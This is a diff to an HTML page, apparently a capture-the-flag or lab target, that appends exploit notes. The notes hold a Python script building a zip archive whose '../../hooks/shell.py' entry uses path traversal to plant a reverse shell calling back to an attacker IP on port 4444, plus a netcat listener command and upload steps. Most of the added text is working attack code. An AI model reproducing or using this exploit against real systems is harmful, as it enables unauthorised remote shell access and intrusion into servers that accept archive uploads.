@@ -297,7 +297,64 @@ Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly
       </div>
     </div>
 
+
+
+
     <footer>Byte Lotus never forgets</footer>
   </div>
 </body>
 </html>
+
+--------------------
+making shell_making.py
+
+import json
+import zipfile
+
+# === CHANGE THESE ===
+LHOST = "10.112.94.104"   #Attacker IP
+LPORT = 4444              #Listener port
+# ====================
+
+manifest = {
+    "name": "python-test",
+    "assets": []
+}
+
+shell = f'''
+import os
+import pty
+import socket
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(({LHOST!r}, {LPORT}))
+
+for descriptor in (0, 1, 2):
+    os.dup2(sock.fileno(), descriptor)
+
+pty.spawn("/bin/bash")
+'''
+
+with zipfile.ZipFile("rev_shell.zip", "w") as archive:
+    archive.writestr("shell.json", json.dumps(manifest))
+    archive.writestr("../../hooks/shell.py", shell)
+
+print("[+] Created rev_shell.zip")
+print(f"[+] Connect back to {LHOST}:{LPORT}")
+print("Upload the ZIP file via the dashboard, then start your listener.")
+
+------------------------------
+#run on attacker machine
+nc -lnvp 4444
+
+______________________________
+
+run on attacker machine shell_making.py
+
+------------------------------
+
+from dashboard upload rev_shell.zip
+
+-------------------------------
+
+You got access to target machine from running listener 
